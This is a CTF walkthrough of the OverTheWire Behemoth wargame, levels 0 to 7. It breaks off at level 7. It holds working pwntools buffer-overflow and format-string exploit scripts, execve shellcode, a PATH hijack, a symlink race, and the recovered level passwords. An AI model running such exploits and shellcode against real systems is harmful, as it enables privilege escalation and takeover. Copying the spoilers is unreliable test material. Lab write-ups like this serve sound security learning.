# Behemoth

Useful shortcuts
```bash
--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/
    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh
```

## Behemoth0 - password behemoth0
-> simple password checking
```bash
ssh behemoth0@behemoth.labs.overthewire.org -p 2221
```

```bash
behemoth0@behemoth:/behemoth$ ./behemoth0 
Password: mypassword1234
Access denied..
```
```bash
behemoth0@behemoth:/behemoth$ ./behemoth0 
Password: pacmanishighoncrack
Access denied..
behemoth0@behemoth:/behemoth$ ./behemoth0 
Password: followthewhiterabbit
Access denied..
behemoth0@behemoth:/behemoth$ ./behemoth0 
Password: unixisbetterthanwindows
Access denied..
```
Running strings are copying the strings doens't seem to work. We don't have a source code so let's analyze with gdb.

```bash
behemoth0@behemoth:/behemoth$ ltrace ./behemoth0 
__libc_start_main(0x80485b1, 1, 0xffffd774, 0x8048680 <unfinished ...>
printf("Password: ")                                                      = 10
__isoc99_scanf(0x804874c, 0xffffd67b, 0xf7fc5000, 13Password: AAAA
)                     = 1
strlen("OK^GSYBEX^Y")                                                     = 11
strcmp("AAAA", "eatmyshorts")                                             = -1
puts("Access denied.."Access denied..
)                                                   = 16
+++ exited (status 0) +++
```
Running *ltrace* makes it easy for us.
```bash
behemoth0@behemoth:/behemoth$ ./behemoth0 
Password: eatmyshorts
Access granted..
$ whoami
behemoth1
$ cat /etc/behemoth_pass/behemoth1
aesebootiv
```

## Behemoth1 - password aesebootiv
-> buffer overflow
```bash
ssh behemoth1@behemoth.labs.overthewire.org -p 2221
```

Another password checking binary.
```bash
behemoth1@behemoth:/behemoth$ ./behemoth1
Password: AAAA
Authentication failure.
Sorry.
```
```bash
behemoth1@behemoth:/behemoth$ ltrace ./behemoth1
__libc_start_main(0x804844b, 1, 0xffffd774, 0x8048480 <unfinished ...>
printf("Password: ")                                                      = 10
gets(0xffffd695, 0xffffd774, 0xf7ffcd00, 0x200000Password: AAAA
)                        = 0xffffd695
puts("Authentication failure.\nSorry."Authentication failure.
Sorry.
)                                   = 31
+++ exited (status 0) +++
```
Running *ltrace* yeilds a call to *gets()*, which we now is vulnerable to a bufferoverflow.

```bash
behemoth1@behemoth:/behemoth$ ./behemoth1
Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Authentication failure.
Sorry.
Segmentation fault
```
We get a SEGFAULT, which is good, we just have to find the offset.

```bash
#!/usr/bin/python

from pwn import *


for x in range (60, 120, 4):
    print(x)
    payload = 'A'*x
    p = process('/behemoth/behemoth1')
    p.sendline(payload)
    p.interactive()
```
Find offset experimentally, it is 67.

```bash
behemoth1@behemoth:/behemoth$ /usr/local/bin/checksec.sh --file ./behemoth1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./behemoth1
```
The stack is executable, we can control the return pointer, let's putshellcode on the stack and redirect execution to it.

```python
#!/usr/bin/python

from pwn import *


shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# 28 byte shellcode

offset = 67
ret = 0xffffd670 #address from the stack when using gdb

ret -= 64
for i in range(0, 512, 8):
    ret+=i
    print(hex(ret))
    payload = '\x90'*39  + shellcode + p32(ret)*4
    p = process('/behemoth/behemoth1')
    p.sendline(payload)
    p.interactive()
    ret-=i
```

```bash
Sorry.
$ whoami
behemoth2
$ cat /etc/behemoth_pass/behemoth2
eimahquuof
```

## Behemoth2 - password eimahquuof
-> use of relative path to program instead of absolute path
```bash
ssh behemoth2@behemoth.labs.overthewire.org -p 2221
```

```bash
behemoth2@behemoth:/behemoth$ ./behemoth2
touch: cannot touch '791': Permission denied
ls
whoami
stop
^C
```

```bash
behemoth2@behemoth:/behemoth$ ./behemoth2
touch: cannot touch '5441': Permission denied
^C
behemoth2@behemoth:/behemoth$ ./behemoth2
touch: cannot touch '5444': Permission denied
```

This looks a bit weird, let's explore further.

```bash
THE MANPAGE OF lstat()

int lstat(const char *pathname, struct stat *statbuf);

DESCRIPTION
       These  functions  return information about a file, in the buffer pointed to by statbuf.  No permissions are required on
       the file itself, but—in the case of stat(), fstatat(), and lstat()—execute (search) permission is required  on  all  of
       the directories in pathname that lead to the file.
lstat() is identical to stat(), except that if pathname is a symbolic link, then it returns information about the  link
       itself, not the file that the link refers to.

On success, zero is returned.  On error, -1 is returned, and errno is set appropriately.

ENOENT - x1pathname is an empty string and AT_EMPTY_PATH was not specified in flags.

Unlink deteles a file from the filesystem.
```

Using *ltrace* we see that it return with an error.
```bash
__lxstat(3, "8164", 0xffffd640)                                 = -1
```
Same thing using *strace*
```bash
lstat64("8143", 0xffffd5a0)             = -1 ENOENT (No such file or directory)
```

Running *ltrace* also shows a *system()* call that calls touch without an absolute path.
```bash
system("touch 53676")
```

We could write our own *touch* function that prints */etc/behemoth_pass/behemoth3*.

```bash
behemoth2@behemoth:/tmp/beh2me$ touch 'touch'
behemoth2@behemoth:/tmp/beh2me$ ls
touch
behemoth2@behemoth:/tmp/beh2me$ chmod +x touch 
behemoth2@behemoth:/tmp/beh2me$ ls
touch
behemoth2@behemoth:/tmp/beh2me$ vim touch 
behemoth2@behemoth:/tmp/beh2me$ ./touch 
cat: /etc/behemoth_pass/behemoth3: Permission d
behemoth2@behemoth:/tmp/beh2me$ PATH=/tmp/beh2me:$PATH
behemoth2@behemoth:/tmp/beh2me$ /behemoth/behemoth2
nieteidiel
```

Touch:
```bash
#!/bin/bash

cat /etc/behemoth_pass/behemoth3
```

## Behemoth3 - password nieteidiel
-> format string vulnerability

```bash
ssh behemoth3@behemoth.labs.overthewire.org -p 2221
```

```bash
behemoth3@behemoth:/behemoth$ ./behemoth3
Identify yourself: Mr.Ocelot
Welcome, Mr.Ocelot

aaaand goodbye again.
```

*Ltrace* shows a call to *fgets* which probably reads our name, it seems it reads 200 chars from stdin.

```bash
behemoth3@behemoth:/behemoth$ ltrace ./behemoth3
__libc_start_main(0x804847b, 1, 0xffffd774, 0x80484e0 <unfinished ...>
printf("Identify yourself: ")                                   = 19
fgets(Identify yourself: Mr.Ocelot
"Mr.Ocelot\n", 200, 0xf7fc55a0)                           = 0xffffd610
printf("Welcome, ")                                             = 9
printf("Mr.Ocelot\n"Welcome, Mr.Ocelot
)                                           = 10
puts("\naaaand goodbye again."
aaaand goodbye again.
)                                 = 23
+++ exited (status 0) +++
```

```bash
behemoth3@behemoth:/behemoth$ /usr/local/bin/checksec.sh --file ./behemoth3
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./behemoth3
```
There is no additional protection against overflows.
Debugging with gdb shows a call to *printf* with our provided input, which means we have a format string vulnerability.
This is what a decompilation would look like.

```c
undefined4 main(void)
{
  char local_cc [200];
  
  printf("Identify yourself: ");
  fgets(local_cc,200,stdin);
  printf("Welcome, ");
  printf(local_cc);
  puts("\naaaand goodbye again.");
  return 0;
}
```
Indeed we have a format string vulnerability, we could overwrite the address of *printf()* in the GOT.

```bash
behemoth3@behemoth:/behemoth$ ./behemoth3
Identify yourself: %x%x%x%x%x
Welcome, 7825782578257825a7825ffffd698f7ffda7c

aaaand goodbye again.
```
Let's find the offset to our string on the stack
```bash
behemoth3@behemoth:/behemoth$ ./behemoth3
Identify yourself: AAAA%x
Welcome, AAAA41414141

aaaand goodbye again.
```
It looks like it is 1. It can also easily be found using pwntools using the following code:
```python
#!/usr/bin/python

from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_payload

def send_payload(payload):
    p.sendline(payload)
    r = p.recvline()
    return r


p = process('/behemoth/behemoth3')
print(FmtStr(execute_fmt=send_payload).offset)
```
=>
```bash
behemoth3@behemoth:/tmp/beh3me$ ./exp.py 
[+] Starting local process '/behemoth/behemoth3': pid 13352
[*] Found format string offset: 1
1
[*] Process '/behemoth/behemoth3' stopped with exit code 0 (pid 13352)
```

We find the address of the address of *puts()* using *objdump*. In the case of this binary: *080497ac*.
```bash
behemoth3@behemoth:/tmp/beh3me$ objdump -R /behemoth/behemoth3

/behemoth/behemoth3:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049794 R_386_GLOB_DAT    __gmon_start__
080497c0 R_386_COPY        stdin@@GLIBC_2.0
080497a4 R_386_JUMP_SLOT   printf@GLIBC_2.0
080497a8 R_386_JUMP_SLOT   fgets@GLIBC_2.0
080497ac R_386_JUMP_SLOT   puts@GLIBC_2.0
080497b0 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
```
We overwrite this with the address some shellcode on the stack. I also included a 90 char NOP sled with the shellcode so it would be easier to predict the address.
Debug with gdb and take the address and add 100 to it to land in the middle of the NOP sled.
```python
#!/usr/bin/python
from pwn import *
import sys

shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

puts = 0x080497ac
address = 0xffffdf65
payload = 'AAAA' + p32(puts) + p32(puts+2) + '%57177x' + '%2$hn' + '%8346x' + '%3$hn'

if len(sys.argv) == 2 and sys.argv[1] == 'debug':
    print(payload)
else:
	print(payload)
    e = ELF('/behemoth/behemoth3')
    p = e.process()
    p.sendline(payload)
    p.interactive()
```
This is the thing done by hand.
The next one is automated using a pwntools library. Both work, but the automated one is more elegant.

```python
#!/usr/bin/python
from pwn import *
import sys
def send_payload(payload):
    p.sendline(payload)
    r = p.recvline()
    return r

shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

puts = 0x080497ac

address = 0xffffdf65
writes = {puts: address}
payload = fmtstr_payload(1, writes, numbwritten=0)

if len(sys.argv) == 2 and sys.argv[1] == 'debug':
    print(payload)
else:
	print(payload)
    e = ELF('/behemoth/behemoth3')
    p = e.process()
    p.sendline(payload)
    p.interactive()
```

```bash
behemoth3@behemoth:/tmp/beh3me$ ./exp.py 
\xac\x97\x0\xad\x97\x0\xae\x97\x0\xaf\x97\x0%85c%1$hhn%122c%2$hhn%32c%3$hhn%4$hhn
[*] '/behemoth/behemoth3'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Starting local process '/behemoth/behemoth3': pid 16369
[*] Switching to interactive mode
Identify yourself: Welcome, \xac\x97\x0\xad\x97\x0\xae\x97\x0\xaf\x97\x0                                                                                    \xac                                                                                                                         \xad                               \xae
$ whoami
behemoth4
$ cat /etc/behemoth_pass/behemoth4
ietheishei
```


```bash
behemoth3@behemoth:/tmp/beh3me$ vim exp.py 
behemoth3@behemoth:/tmp/beh3me$ ./exp.py 
AAAA\xac\x97\x0\xae\x97\x0%57177x%2$hn%8346x%3$hn
[*] '/behemoth/behemoth3'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Starting local process '/behemoth/behemoth3': pid 16469
[*] Switching to interactive mode
Identify yourself: Welcome, AAAA\xac\x97\x0\xae\x97\x0                                                                                                                                                                                                                                                                                                                                                            
$ ls
exp.py    payload  peda-session-behemoth3.txt  shellcode
$ whoami
behemoth4
```

## Behemoth4 - password ietheishei

```bash
ssh behemoth4@behemoth.labs.overthewire.org -p 2221
```
I see some function calls using ltrace, let's see what they do.

```bash
int fgetc(FILE *stream);
fgetc()  reads the next character from stream and returns it as an unsigned char cast to an int, or EOF on end of
       file or error.
```

This is a decompilation of the program.
```c
undefined4 main(undefined param_1)

{
  char local_30 [20];
  int integer;
  FILE *fin;
  __pid_t PID;
  undefined *param;
  
  param = &param_1;
  PID = getpid();
  sprintf(local_30,"/tmp/%d",PID);
  fin = fopen(local_30,"r");
  if (fin == (FILE *)0x0) {
    puts("PID not found!");
  }
  else {
    sleep(1);
    puts("Finished sleeping, fgetcing");
    while( true ) {
      integer = fgetc(fin);
      if (integer == -1) break;
      putchar(integer);
    }
    fclose(fin);
  }
  return 0;
}
```
Comparing *integer* to *-1* is the same as comparing to EOF (EOF is -1 I think)

```c
putchar(c) is equivalent to putc(c, stdout).
putc()  is  equivalent  to  fputc() except that it may be implemented as a macro which evaluates stream more than
       once.
fputc() writes the character c, cast to an unsigned char, to stream.
```
So *putchar()* just prints a character.

SOOO, the program writes to a variable on the stack the location of the file `/tmp/%d` where `%d` is the PID of the program.
It opens a stream to that file, then is the stream is invalid, prints "PID not found!" and returns.
If the stream is valid, it sleeps for a second, then prints with puts() "Finished sleeping, fgetcing".
Then we have a `while(true)` loop, which reads until the character is an EOF, else if prints the character with `putchar()`
It closes the stream and returns.

So the process with open a file with `/tmp/PID`, but we can find the PID of the running process.

Also, while researching, I found this on google, which pointed to an interesting paper on opening a file and not getting hacked.
(https://research.cs.wisc.edu/mist/safefile/safeopen_ares2008.pdf)[https://research.cs.wisc.edu/mist/safefile/safeopen_ares2008.pdf]
```
fopen internally calls open, but O_CREAT is always used without O_EXCL, so fopen is vulnerable to the symbolic link attacks described above when creating a file
```
So the file has to be already created, and we have to remove it and create another that is a symlink to */etc/behemoth_pass/behemoth5*.
Then the program will print it out to us. This is the python script:
```python
#!/usr/bin/python

from pwn import *
import os

p = process('/behemoth/behemoth4')
print(p.pid)

os.system("rm /tmp/" + str(p.pid))
os.system("ln -s " + "/etc/behemoth_pass/behemoth5" + " " + "/tmp/" + str(p.pid))

p.interactive()
```
```python
#!/usr/bin/python
import sys
import string
import os

def atoi(str):
    resultant = 0
    for i in range(len(str)):
        resultant = resultant * 10 + (ord(str[i]) - ord('0'))
    return resultant

if len(sys.argv)!=3:
    print("Usage " + sys.argv[0] + " <i> <j>")
else:
    x = atoi(sys.argv[1])
    y = atoi(sys.argv[2])
    for i in range(x, y):
        os.system("touch /tmp/" + str(i))
```
I also made a script to create files in a range of numbers, that I used before executing the program, knowing the expected PID from a previous execution.
```bash
behemoth4@behemoth:/tmp/beh4me$ ./exp.py 
[+] Starting local process '/behemoth/behemoth4': pid 1474
1474
[*] Switching to interactive mode
Finished sleeping, fgetcing
aizeeshing
[*] Process '/behemoth/behemoth4' stopped with exit code 0 (pid 1474)
[*] Got EOF while reading in interactive
$ 
[*] Got EOF while sending in interactive
```

## Behemoth5 - password aizeeshing

```bash
ssh behemoth5@behemoth.labs.overthewire.org -p 2221
```

At first glance, it doesn't seem to do anything visible.
```bash
behemoth5@behemoth:/behemoth$ ./behemoth5
behemoth5@behemoth:/behemoth$ ./behemoth5 AAAA
```

Running `strace` yields some interesting results, as it trying to open */etc/behemoth_pass/behemoth6*
```bash
behemoth5@behemoth:/behemoth$ strace ./behemoth5
execve("./behemoth5", ["./behemoth5"], [/* 18 vars */]) = 0
strace: [ Process PID=1571 runs in 32 bit mode. ]
brk(NULL)                               = 0x804b000
fcntl64(0, F_GETFD)                     = 0
fcntl64(1, F_GETFD)                     = 0
fcntl64(2, F_GETFD)                     = 0
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fd2000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=36357, ...}) = 0
mmap2(NULL, 36357, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7fc9000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib32/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\204\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1787812, ...}) = 0
mmap2(NULL, 1796604, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7e12000
mmap2(0xf7fc3000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0xf7fc3000
mmap2(0xf7fc6000, 10748, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7fc6000
close(3)                                = 0
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7e10000
set_thread_area({entry_number:-1, base_addr:0xf7e10700, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 (entry_number:12)
mprotect(0xf7fc3000, 8192, PROT_READ)   = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0xf7ffc000, 4096, PROT_READ)   = 0
munmap(0xf7fc9000, 36357)               = 0
brk(NULL)                               = 0x804b000
brk(0x806c000)                          = 0x806c000
open("/etc/behemoth_pass/behemoth6", O_RDONLY) = -1 EACCES (Permission denied)
dup(2)                                  = 3
fcntl64(3, F_GETFL)                     = 0x8002 (flags O_RDWR|O_LARGEFILE)
fstat64(3, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 51), ...}) = 0
write(3, "fopen: Permission denied\n", 25fopen: Permission denied
) = 25
close(3)                                = 0
exit_group(1)                           = ?
+++ exited with 1 +++
```

Running *ltrace* shows similar results, a call to `fopen()`
```bash
behemoth5@behemoth:/behemoth$ ltrace ./behemoth5
__libc_start_main(0x804872b, 1, 0xffffd774, 0x8048920 <unfinished ...>
fopen("/etc/behemoth_pass/behemoth6", "r")                      = 0
perror("fopen"fopen: Permission denied
)                                                 = <void>
exit(1 <no return ...>
+++ exited (status 1) +++
```
Let's analyze with `gdb`...too complex. Let's see a disassembly

```c

void main(undefined param_1)

{
  long lVar1;
  size_t sVar2;
  int iVar3;
  undefined local_38 [4];
  undefined4 local_34;
  undefined auStack48 [8];
  ssize_t local_28;
  int local_24;
  hostent *local_20;
  char *local_1c;
  FILE *local_18;
  size_t local_14;
  undefined1 *puStack12;
  
  puStack12 = &param_1;
  local_14 = 0;
  local_18 = fopen("/etc/behemoth_pass/behemoth6","r");
  if (local_18 == (FILE *)0x0) {
    perror("fopen");
    exit(1);
  }
  fseek(local_18,0,2);
  lVar1 = ftell(local_18);
  local_14 = lVar1 + 1;
  rewind(local_18);
  local_1c = (char *)malloc(local_14);
  fgets(local_1c,local_14,local_18);
  sVar2 = strlen(local_1c);
  local_1c[sVar2] = '\0';
  fclose(local_18);
  local_20 = gethostbyname("localhost");
  if (local_20 == (hostent *)0x0) {
    perror("gethostbyname");
    exit(1);
  }
  local_24 = socket(2,2,0);
  if (local_24 == -1) {
    perror("socket");
    exit(1);
  }
  local_38._0_2_ = 2;
  iVar3 = atoi("1337");
  local_38._2_2_ = htons((uint16_t)iVar3);
  local_34 = *(undefined4 *)*local_20->h_addr_list;
  memset(auStack48,0,8);
  sVar2 = strlen(local_1c);
  local_28 = sendto(local_24,local_1c,sVar2,0,(sockaddr *)local_38,0x10);
  if (local_28 == -1) {
    perror("sendto");

    exit(1);
  }
  close(local_24);

  exit(0);
}
```
We observe that the function NEVER returns.

There are many functions that I don't recognize, let's find out what they do.

```c
int fseek(FILE *stream, long offset, int whence);

The  fseek()  function  sets  the file position indicator for the stream pointed to by stream.
       The new position, measured in bytes, is obtained by adding offset bytes to the position speci‐
       fied  by  whence.  If whence is set to SEEK_SET, SEEK_CUR, or SEEK_END, the offset is relative
       to the start of the file, the current position indicator,  or  end-of-file,  respectively.   A
       successful  call  to  the fseek() function clears the end-of-file indicator for the stream and
       undoes any effects of the ungetc(3) function on the same stream.

The ftell() function obtains the current value of the file position indicator for  the  stream
       pointed to by stream.


The  rewind() function sets the file position indicator for the stream pointed to by stream to
       the beginning of the file.  It is equivalent to:

              (void) fseek(stream, 0L, SEEK_SET)
```

```c
uint16_t htons(uint16_t hostshort);
The htons() function converts the unsigned short integer hostshort from  host  byte  order  to
       network byte order.

int socket(int domain, int type, int protocol);

```
In our case, domain is 2, type is 2, and protocol is 0 (from what I know, in most cases it is 0, since most protocol families only have 1 protocol)

In `<socket.h>` I found that:
```c
#define AF_INET		2	/* Internet IP Protocol 	*/


/// also
#define SOCK_DGRAM	2		/* datagram (conn.less) socket	*/
```
Which means it opens a socket with UDP, probably sending raw bytes.


```c

void main(undefined param_1)

{
  long poz;
  size_t heap_len;
  int port_maybe;
  undefined sockadd [4];
  undefined4 local_34;
  undefined auStack48 [8];
  ssize_t local_28;
  int socket;
  hostent *ptr_hostent;
  char *heap_buff;
  FILE *fin;
  size_t marime;
  undefined1 *puStack12;
  
  puStack12 = &param_1;
  marime = 0;
  fin = fopen("/etc/behemoth_pass/behemoth6","r");
  if (fin == (FILE *)0x0) {
    perror("fopen");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fseek(fin,0,2);
  poz = ftell(fin);
  marime = poz + 1;
  rewind(fin);
  heap_buff = (char *)malloc(marime);
  fgets(heap_buff,marime,fin);
  heap_len = strlen(heap_buff);
  heap_buff[heap_len] = '\0';
  fclose(fin);
  ptr_hostent = gethostbyname("localhost");
  if (ptr_hostent == (hostent *)0x0) {
    perror("gethostbyname");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  socket = ::socket(2,2,0);
  if (socket == -1) {
    perror("socket");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  sockadd._0_2_ = 2;
  port_maybe = atoi("1337");
  sockadd._2_2_ = htons((uint16_t)port_maybe);
  local_34 = *(undefined4 *)*ptr_hostent->h_addr_list;
  memset(auStack48,0,8);
  heap_len = strlen(heap_buff);
  local_28 = sendto(socket,heap_buff,heap_len,0,(sockaddr *)sockadd,0x10);
  if (local_28 == -1) {
    perror("sendto");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  close(socket);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
Here I guesses some of the variables meaning. It seems like it is sending the contents of the file containing the password to localhost on port 1337, via UDP.

In one shell, and run the program in the other. Use `netcat -u` for UDP mode.
```bash
behemoth5@behemoth:/behemoth$ nc 127.0.0.1 -ulvp 1337
listening on [any] 1337 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 48190
mayiroeche
```

## Behemoth6 - password mayiroeche

```bash
ssh behemoth6@behemoth.labs.overthewire.org -p 2221
```

Running the program prints 'Invalid input'.
```bash
behemoth6@behemoth:/behemoth$ ./behemoth6
Incorrect output.
```

```bash
behemoth6@behemoth:/behemoth$ ltrace ./behemoth6
__libc_start_main(0x80485db, 1, 0xffffd774, 0x80486d0 <unfinished ...>
popen("/behemoth/behemoth6_reader", "r")                        = 0x804b008
malloc(10)                                                      = 0x804b0b8
fread(0x804b0b8, 10, 1, 0x804b008)                              = 1
pclose(0x804b008 <no return ...>
--- SIGCHLD (Child exited) ---
<... pclose resumed> )                                          = 0
strcmp("Couldn't o", "HelloKitty")                              = -1
puts("Incorrect output."Incorrect output.
)                                       = 18
+++ exited (status 0) +++
```
Running `ltrace` shows us that the process runs `popen()`

```bash
popen("/behemoth/behemoth6_reader", "r")
```

```bash
behemoth6@behemoth:/behemoth$ file behemoth6_reader 
behemoth6_reader: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9510a50101cb24e6d6b7b8cfd3e4f4bbdad46de6, not stripped
behemoth6@behemoth:/behemoth$ ./behemoth6_reader 
Couldn't open shellcode.txt!
```
The other file seems to be another ELF executable that says it can't open shellcode.txt :)

```bash
behemoth6@behemoth:/behemoth$ ltrace ./behemoth6_reader 
__libc_start_main(0x80485ab, 1, 0xffffd764, 0x80486b0 <unfinished ...>
fopen("shellcode.txt", "r")                                     = 0
puts("Couldn't open shellcode.txt!"Couldn't open shellcode.txt!
)                            = 29
+++ exited (status 0) +++
```
It looks like it actually tries to open shellcode.txt, let's give it to it.

```bash
behemoth6@behemoth:/tmp/beh6me$ ltrace /behemoth/behemoth6_reader 
__libc_start_main(0x80485ab, 1, 0xffffd764, 0x80486b0 <unfinished ...>
fopen("shellcode.txt", "r")                                                 = 0x804b008
fseek(0x804b008, 0, 2, 0x200000)                                            = 0
ftell(0x804b008, 0, 2, 0x200000)                                            = 10
rewind(0x804b008, 0, 2, 0x200000)                                           = 0xfbad2488
malloc(10)                                                                  = 0x804c170
fread(0x804c170, 10, 1, 0x804b008)                                          = 1
fclose(0x804b008)                                                           = 0
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
It just Segfaults, let's debug with gdb.

```bash
gdb -q ./behemoth6_reader
Reading symbols from ./behemoth6_reader...(no debugging symbols found)...done.
(gdb) source /usr/local/peda/peda.py 
gdb-peda$ 

```
I analyzed the assembly on paper, it seems that it executes what is found in *shellcode.txt*, but it can't contain the character '\x0b', which is common in most shellcodes off the internet.
We have to write our own.

```bash
behemoth6@behemoth:/tmp/beh6me$ cat shellcode.s 
BITS 32

call caterinca ;puts the address of /bin/sh as the return address
db "/bin/sh" ; newline and carriage return

caterinca:
; execve(const char *filename,char *const argv[], char *cosnt envp[])  
pop ecx ; pop the address of /bin/sh
push 0x0
push ecx
push ecx
mov eax, 11 ;syscall 11
int 0x80

behemoth6@behemoth:/tmp/beh6me$ nasm shellcode.s
behemoth6@behemoth:/tmp/beh6me$ cat shellcode
�/bin/shYjQQ�
             
behemoth6@behemoth:/tmp/beh6me$ hexdump -C shellcode
00000000  e8 07 00 00 00 2f 62 69  6e 2f 73 68 59 6a 00 51  |...../bin/shYj.Q|
00000010  51 b8 0b 00 00 00 cd 80                           |Q.......|
00000018
```
It seems to also have *\x0b*...let's see whta is does.
```bash
behemoth6@behemoth:/tmp/beh6me$ ndisasm shellcode
00000000  E80700            call word 0xa
00000003  0000              add [bx+si],al
00000005  2F                das
00000006  62696E            bound bp,[bx+di+0x6e]
00000009  2F                das
0000000A  7368              jnc 0x74
0000000C  59                pop cx
0000000D  6A00              push byte +0x0
0000000F  51                push cx
00000010  51                push cx
00000011  B80B00            mov ax,0xb
00000014  0000              add [bx+si],al
00000016  CD80              int 0x80
```
Ohhhh, execve is syscall 11, which is 0xb. We could put 12 and subtract 1 and we're good to go.

```bash
behemoth6@behemoth:/tmp/beh6me$ cat shellcode.s
BITS 32

call caterinca ;puts the address of /bin/sh as the return address
db "/bin/sh" ; newline and carriage return

caterinca:
; execve(const char *filename,char *const argv[], char *cosnt envp[])  
pop ecx ; pop the address of /bin/sh
push 0x0
push ecx
push ecx
mov eax, 12 ;we need syscall 11
dec eax
int 0x80

behemoth6@behemoth:/tmp/beh6me$ nasm shellcode.s
behemoth6@behemoth:/tmp/beh6me$ hexdump -C shellcode
00000000  e8 07 00 00 00 2f 62 69  6e 2f 73 68 59 6a 00 51  |...../bin/shYj.Q|
00000010  51 b8 0c 00 00 00 48 cd  80                       |Q.....H..|
00000019
```
We successfully got rid that byte, let's test it. It doesn't work...
You don't put args for syacalls on the stack, but in registers...
```bash
behemoth6@behemoth:/tmp/beh6me$ nasm shellcode.s
behemoth6@behemoth:/tmp/beh6me$ mv shellcode shellcode.txt 
behemoth6@behemoth:/tmp/beh6me$ /behemoth/behemoth6_reader 
$ whoami
behemoth6
```
I successfully used the *behemoth6_reader* to execute shellcode, but this one doesn't have the SUID bit set.
```bash
behemoth6@behemoth:/tmp/beh6me$ cat shellcode.s
BITS 32

call caterinca ;puts the address of /bin/sh as the return address
db "/bin/shXAAAABBBB" ; /bin/sh

caterinca:
; execve(const char *filename,char *const argv[], char *cosnt envp[])  
pop ecx ; pop the address of /bin/sh
xor eax, eax
mov [ecx+7], al
mov [ecx+8], ecx
mov [ecx+12], eax ;32 bit null
mov eax, 12 ;syscall 11
dec eax
mov ebx, ecx
lea ecx, [ebx+8]
lea edx, [ebx+12]
int 0x80
```

Without analyzing the behemoth6 program, it is logical that, since it calls the other program, it will give us a shell, this one having SUID.
```bash
behemoth6@behemoth:/tmp/beh6me$ /behemoth/behemoth6
cat /etc/behemoth_pass/behemoth7 > /tmp/beh6me/pass
/bin/sh: 1: cannot create /tmp/beh6me/pass: Permission denied
^C
behemoth6@behemoth:/tmp/beh6me$ touch pass
behemoth6@behemoth:/tmp/beh6me$ chmod 777 pass
behemoth6@behemoth:/tmp/beh6me$ /behemoth/behemoth6
cat /etc/behemoth_pass/behemoth7 > /tmp/beh6me/pass
^C
behemoth6@behemoth:/tmp/beh6me$ cat pass
baquoxuafo
```

## Behemoth7 - password baquoxuafo

```bash
ssh behemoth7@behemoth.labs.overthewire.org -p 2221
```

The program doesn't seem to do anything obvious.
```bash
behemoth7@behemoth:/behemoth$ ./behemoth7
behemoth7@behemoth:/behemoth$ ./behemoth7 AAAAA
```

Running *ltrace* we notice a lot of *strlen()* and *memset()* calls. Those seem to all be envinroment variables.
